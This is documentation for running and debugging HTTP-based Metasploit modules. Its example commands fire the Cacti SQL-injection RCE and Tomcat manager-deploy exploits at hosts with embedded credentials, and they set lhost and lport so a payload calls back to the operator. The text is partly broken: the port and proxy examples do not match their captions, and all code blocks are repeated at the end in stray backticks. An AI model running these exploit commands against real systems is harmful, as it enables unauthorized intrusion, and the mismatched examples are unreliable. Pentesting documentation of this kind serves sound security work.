## HTTP Workflows
This document is generic advice for running and debugging HTTP based Metasploit modules, but it is best to use a Metasploit module which is specific to the application that you are pentesting. For instance:
```msf
msf6 > search tomcat http
```

### HTTP Examples
Auxiliary modules:
```
use auxiliary/scanner/http/title
run https://example.com
```

Specifying credentials and payload information:
```
use exploit/unix/http/cacti_filter_sqli_rce
run http://admin:pass@application.local/cacti/ lhost=tun0 lport=4444
run 'http://admin:pass with spaces@application.local/cacti/' lhost=tun0 lport=4444
```

Specifying alternative ports:
```
use auxiliary/scanner/http/title
run http://example.com HttpTrace=true verbose=true
```

### HTTP Debugging
You can log all HTTP requests and responses to the Metasploit console with the `HttpTrace` option, as well as enable additional verbose logging:
```
use auxiliary/scanner/http/title
run http://example.com HttpTrace=true verbose=true proxies=HTTP:127.0.0.1:8080
```

For instance:
```
use exploit/unix/http/cacti_filter_sqli_rce

Module options (exploit/unix/http/cacti_filter_sqli_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   ... Omitted ...
*  PASSWORD   admin            no        Password to login with
   TARGETURI  /cacti/          yes       The URI of Cacti
*  USERNAME   user             yes       User to login with
   ... Omitted ...

check http://admin:user@application.local/cacti/

USERNAME and PASSWORD will be set to 'admin' and 'user'
```

To send all HTTP requests through a proxy, i.e. through Burp Suite:
```
use exploit/multi/http/tomcat_mgr_deploy
run http://admin:admin@192.168.123.6:8888 HttpTrace=true verbose=true lhost=192.168.123.1
```

`msf
msf6 > search tomcat http
`

`
use auxiliary/scanner/http/title
run https://example.com
`

`
use exploit/unix/http/cacti_filter_sqli_rce
run http://admin:pass@application.local/cacti/ lhost=tun0 lport=4444
run 'http://admin:pass with spaces@application.local/cacti/' lhost=tun0 lport=4444
`

`
use auxiliary/scanner/http/title
run http://example.com HttpTrace=true verbose=true
`

`
use auxiliary/scanner/http/title
run http://example.com HttpTrace=true verbose=true proxies=HTTP:127.0.0.1:8080
`

`
use exploit/unix/http/cacti_filter_sqli_rce

Module options (exploit/unix/http/cacti_filter_sqli_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   ... Omitted ...
*  PASSWORD   admin            no        Password to login with
   TARGETURI  /cacti/          yes       The URI of Cacti
*  USERNAME   user             yes       User to login with
   ... Omitted ...

check http://admin:user@application.local/cacti/

USERNAME and PASSWORD will be set to 'admin' and 'user'
`

`
use exploit/multi/http/tomcat_mgr_deploy
run http://admin:admin@192.168.123.6:8888 HttpTrace=true verbose=true lhost=192.168.123.1
`

